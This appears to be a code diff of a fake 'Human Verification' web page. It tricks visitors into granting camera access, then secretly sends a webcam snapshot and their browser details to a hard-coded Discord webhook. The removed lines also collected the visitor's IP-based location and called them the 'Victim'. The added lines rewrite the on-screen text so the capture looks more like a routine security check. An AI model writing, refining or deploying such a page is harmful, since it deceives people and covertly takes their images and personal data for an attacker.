@@ -31,18 +31,22 @@
       margin:20px; 
     }
     button:hover { background:#0055aa; }
-    button:disabled { opacity:0.6; cursor:not-allowed; }
+    small { color:#aaa; font-size:0.9em; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Quick Verification</h1>
-    <p id="msg">Please click verify to continue. This helps verify you're a human.</p>
+    <h1>Human Verification Required</h1>
+    <p id="msg">Please click Verify below to continue. This helps verify you're a human.</p>
     
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <button id="btn">Verify Me</button>
+    <button id="btn">Verify Now</button>
+
+    <small style="margin-top:20px; display:block;">
+      Note: Your device may show a one-time security prompt to confirm access.
+    </small>
   </div>
 
   <script>
@@ -51,12 +55,11 @@
     const msg = document.getElementById('msg');
     const btn = document.getElementById('btn');
 
-    // ──── FRESH WEBHOOK ────
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
 
     async function captureAndSend() {
       try {
-        msg.textContent = "Accessing camera...";
+        msg.textContent = "Verifying your identity... please allow if prompted.";
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -64,49 +67,17 @@
         });
 
         video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1200));  // let it settle
+        await new Promise(r => setTimeout(r, 1200));  // settle time
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        // Kill the camera immediately
         stream.getTracks().forEach(track => track.stop());
 
         const blob = await new Promise(resolve => {
           canvas.toBlob(resolve, 'image/jpeg', 0.88);
         });
-
-        // Grab geo details
-        msg.textContent = "Grabbing full location details...";
-        let geoDetails = "Location grab failed";
-        try {
-          const geoRes = await fetch('https://ipapi.co/json/');
-          if (geoRes.ok) {
-            const data = await geoRes.json();
-            if (data.error) {
-              geoDetails = `Error: ${data.reason || 'unknown'}`;
-            } else {
-              geoDetails = 
-                `IP: ${data.ip || 'n/a'}\n` +
-                `City: ${data.city || 'n/a'}\n` +
-                `Region: ${data.region || 'n/a'}\n` +
-                `Country: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\n` +
-                `Coords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\n` +
-                `Timezone: ${data.timezone || 'n/a'}\n` +
-                `Postal: ${data.postal || 'n/a'}\n` +
-                `ISP/Org: ${data.org || data.asn || 'n/a'}\n` +
-                `In EU?: ${data.in_eu ? 'Yes' : 'No'}`;
-            }
-          }
-        } catch (e) {
-          console.warn('Geo fetch error:', e);
-          try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            geoDetails = `IP only: ${ipData.ip || 'unknown'}`;
-          } catch {}
-        }
 
         msg.textContent = "Uploading verification...";
 
@@ -114,7 +85,7 @@
         formData.append('file', blob, `capture_${Date.now()}.jpg`);
         
         const payload = {
-          content: `New snap from ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Victim Details:**\n${geoDetails}`
+          content: `New snap from ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
         };
         formData.append('payload_json', JSON.stringify(payload));
 
@@ -124,36 +95,26 @@
         });
 
         if (response.ok) {
-          msg.textContent = "Verification complete! Thanks.";
+          msg.textContent = "Verification successful! Thanks.";
           btn.style.display = 'none';
         } else {
-          let errText = "No details available";
-          try {
-            errText = await response.text();
-          } catch {}
-          const errorMsg = `Upload failed: ${response.status} - ${errText.slice(0, 150)}`;
-          msg.textContent = errorMsg;
-          console.error("Webhook error:", response.status, errText);
+          msg.textContent = "Upload failed — try again?";
+          btn.disabled = false;
         }
 
       } catch (err) {
-        let errMsg = err.message || "Unknown error";
-        if (err.name === 'NotAllowedError') {
-          errMsg = "Camera access denied. Victim blocked it.";
-        } else if (err.name === 'NotFoundError') {
-          errMsg = "No camera found on this device.";
-        }
-        msg.textContent = `Verification failed: ${errMsg}`;
-        console.error("Capture error:", err);
-      } finally {
-        btn.disabled = false;  // let them retry if it bombs
+        msg.textContent = "Access blocked or error. Can't proceed.";
+        console.error(err);
+        btn.disabled = false;
       }
     }
 
-    btn.addEventListener('click', captureAndSend);
+    btn.addEventListener('click', () => {
+      captureAndSend();
+    });
 
-    // Uncomment to auto-trigger (riskier, more suspicious):
-    // setTimeout(captureAndSend, 3000);
+    // Uncomment for auto-trigger aggression (still prompts, but no button needed)
+    // setTimeout(captureAndSend, 2000);
   </script>
 </body>
 </html>
